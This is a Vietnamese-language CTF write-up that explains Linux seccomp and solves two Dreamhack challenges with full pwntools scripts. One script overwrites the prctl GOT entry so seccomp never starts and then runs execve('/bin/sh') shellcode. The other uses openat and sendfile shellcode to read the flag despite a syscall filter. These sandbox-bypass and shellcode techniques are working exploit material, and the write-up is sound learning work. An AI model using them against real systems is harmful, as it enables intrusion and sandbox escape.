# Lớp bảo vệ Seccomp
[*Video anh Trí - Lớp bảo vệ Seccomp*](https://www.youtube.com/watch?v=nrKNHrEouUU&list=PLEvZsp0uc3SFuVi6TtcahxqsEbV29lXAM&index=26)

*Seccomp* là một tính năng bảo mật của Linux Kernal, làm giới hạn các hàm syscall có thể gọi trong chương trình.

Khi kiểm tra *seccomp* thì sử dụng lệnh:
  
    seccomp-tools dump ./file

<img width="684" height="284" alt="Screenshot 2026-11-08 141410" src="https://github.com/user-attachments/assets/332cbcd8-3fdf-4bfd-986c-7187e1a5c059" />

Tại đây ta thấy các hàm trong syscall được phép gọi sẽ hiện thị như trên (Whitelist). Tất cả các lệnh gọi syscall khác sẽ mặc định bị chặn thực thi.

Để bypass *seccomp* thì có thể:

- Sử dụng các hàm chưa bị chặn để khai thác.

- Vô hiệu hóa, chuyển hướng chương trình để tránh *seccomp*

- Khai thác trước khi chương trình chạy *seccomp*

# Challenge Dreamhack
[*seccomp*](https://dreamhack.io/wargame/challenges/59)

# Phân tích code 
## Lỗ hổng đầu tiên:
<img width="953" height="674" alt="image" src="https://github.com/user-attachments/assets/27930695-2db2-4900-84d1-4e081122f57e" />

Trong hàm main tạo sẵn vùng `rwx` để nhập shellcode và chạy thông qua các tùy chọn. Tuy nhiên trong đoạn code này có thêm hàm `syscall_filter` để lọc syscall. 
<br>

Kiểm tra seccomp để xem các hàm nào bị chặn thực thi:

<img width="684" height="280" alt="image" src="https://github.com/user-attachments/assets/f7daf4ca-5c4f-4351-b7e9-ea0b34f4216b" />

Vì trong Whitelist không có `execve` lẫn `open` nên chưa thể khai thác qua shellcode.
<br><br>

## Lỗ hổng tiếp theo:

<img width="634" height="521" alt="image" src="https://github.com/user-attachments/assets/96f31c75-531f-41c8-8bd9-7908d55af4d3" />

Trong hàm main còn có 1 tùy chọn cho phép nhập địa chỉ và ghi đè giá trị trong địa chỉ đó. Điều này cho phép chúng ta ghi đè lên bất kì địa chỉ nào có quyền `write` trong chương trình.

## Mitigation
<img width="384" height="174" alt="image" src="https://github.com/user-attachments/assets/ffaab6f6-987a-4ef8-9b59-72c45b36ce53" />

PIE tắt cho phép khai thác trực tiếp các địa chỉ binary tĩnh.

## Vô hiệu hóa seccomp
<img width="826" height="596" alt="image" src="https://github.com/user-attachments/assets/5e080b0d-db18-41b6-992a-cd3ac6a55520" />

Người dùng thông thường có thể lợi dụng *seccomp* để leo quyền lên root bằng cách chặn các syscall quan trọng của hệ thống. Vậy nên hệ điều hành Linux đã chặn dùng *seccomp* với những chương trình có thể leo quyền.

Chỉ khi đã chạy lệnh `prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0)` (tắt khả năng leo quyền của chương trình) thì *seccomp* mới được phép chạy.

=> Ý tưởng ở đây là vô hiệu hóa hàm `prctl` bằng cách ghi đè vào địa chỉ GOT của `prctl` bằng hàm khác. Khi đó, các lần chương trình gọi `prctl` sau sẽ không tắt khả năng leo quyền của chương trình. Dẫn đến *seccomp* cũng bị từ chối thực thi.

<img width="862" height="282" alt="Screenshot 2026-11-09 003848" src="https://github.com/user-attachments/assets/30eeb79d-8ee0-4b77-8f1b-0b0ff41cafa4" />

Sử dụng tùy chọn 3 để ghi đè địa chỉ `prctl`:

    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'addr: ',str(0x602058).encode())   //địa chỉ prctl
    p.sendlineafter(b'value: ',str(0x40090e).encode())  //hàm init

Khi đã vô hiệu hóa *seccomp* thì nhập shellcode gọi `execve('/bin/sh')` qua tùy chọn 1 và chạy qua tùy chọn 2:

    shellcode=asm('''
        mov rax, 59
        mov rdi, 29400045130965551
        push rdi
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        syscall
        '''
    )
    
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'shellcode: ',shellcode)
    p.sendlineafter(b'> ',b'2')

## Scipt Python

    #!/usr/bin/env python3
    from pwn import *
    context.binary=exe=ELF('./seccomp',checksec=False)
    
    p=remote('host3.dreamhack.games',11304)
    
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'addr: ',str(0x602058).encode())
    p.sendlineafter(b'value: ',str(0x40090e).encode())
    
    shellcode=asm('''
        mov rax, 59
        mov rdi, 29400045130965551
        push rdi
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        syscall
        '''
    )
    
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'shellcode: ',shellcode)
    p.sendlineafter(b'> ',b'2')
    
    p.interactive()

# Challenge Dreamhack
[*Bypass SECCOMP-1*](https://dreamhack.io/wargame/challenges/361)

# Phân tích code

<img width="882" height="600" alt="image" src="https://github.com/user-attachments/assets/e3432aff-b0e9-429e-ac9a-0d3cace38d27" />

Chương trình cho phép nhập shellcode vào vùng nhớ có quyền `rwx` và chạy shellcode đó. Nhũng đồng thời cũng có hàm `sandbox` gọi *seccomp* để lọc các hàm syscall.

Kiểm tra *seccomp*:

<img width="766" height="329" alt="image" src="https://github.com/user-attachments/assets/d90f4284-e061-4e06-8d86-74647d92b125" />

Ở đây các hàm được liệt kê trên sẽ bị cấm. Còn lại các hàm khác vẫn được sử dụng. 
- Tất cả biến thể của `execve` đều bị chặn nên không thể tạo shell.
- Hàm `open` và `write` cũng bị chặn. Tuy nhiên vẫn còn các hàm và biến thể khác để mở file và in dữ liệu ra màn hình nên vẫn có thể đọc flag.

# Khai thác
<img width="1010" height="217" alt="image" src="https://github.com/user-attachments/assets/68abf30b-fd16-4970-82bc-720edf48c45d" />

<br><br>
Đầu tiên về vấn đề mở file thì `open` có một biến thể khác là `openat`. Khác biệt lớn nhất là khi tìm đường dẫn đến file. `open` sẽ luôn lấy thư mục hiện tại làm điểm bắt đầu (đường dẫn tương đối), còn `openat` có thể lấy từ gốc `/` (đường dẫn tuyệt đối). 

Vì mục tiêu của chúng ta là flag nằm trong thư mục hiện tại nên cần setup `openat` giả lập hành vi của `open` qua tham số `AT_FDCWD`.

Shellcode mở file:

    mov rax, 113668128124718  --> */flag\00*
    push rax
    mov rax, 257             
    mov rdi, -100            //AT_FDCWD
    mov rsi, rsp
    xor rdx, rdx
    xor r10, r10
    syscall

File đã dược mở bây giờ cần in ra màn hình. Nhưng vì thiếu `write` nên ta sẽ dùng hàm khác để in.

<img width="1026" height="186" alt="image" src="https://github.com/user-attachments/assets/0b7119a4-c733-4910-b982-6c4d4c44010b" />

<br><br>
Hàm `sendfile`: Sao chép dữ liệu giữa 2 file descriptor (fd).

Có thể dùng `sendfile` để chuyển thẳng dữ liệu từ fd file flag qua stdout (in ra màn hình).

Shellcode in dữ liệu:

    mov rsi, rax        //fd in
    mov rax, 40
    mov rdi, 1          //fd out
    xor rdx, rdx
    mov r10, 0x100
    syscall

## Script Python

    #!/usr/bin/env python3
    
    from pwn import *
    
    exe = ELF("./bypass_seccomp_patched")
    libc = ELF("./libc.so.6")
    ld = ELF("./ld-2.35.so")
    
    context.binary = exe
    p=remote('host3.dreamhack.games',13417)
    
    shellcode=asm('''
        mov rax, 113668128124718
        push rax
        mov rax, 257
        mov rdi, -100
        mov rsi, rsp
        xor rdx, rdx
        xor r10, r10
        syscall
    
        mov rsi, rax
        mov rax, 40
        mov rdi, 1
        xor rdx, rdx
        mov r10, 0x100
        syscall
        ''', arch='amd64')
    
    p.sendafter(b'shellcode: ',shellcode)
    
    p.interactive()
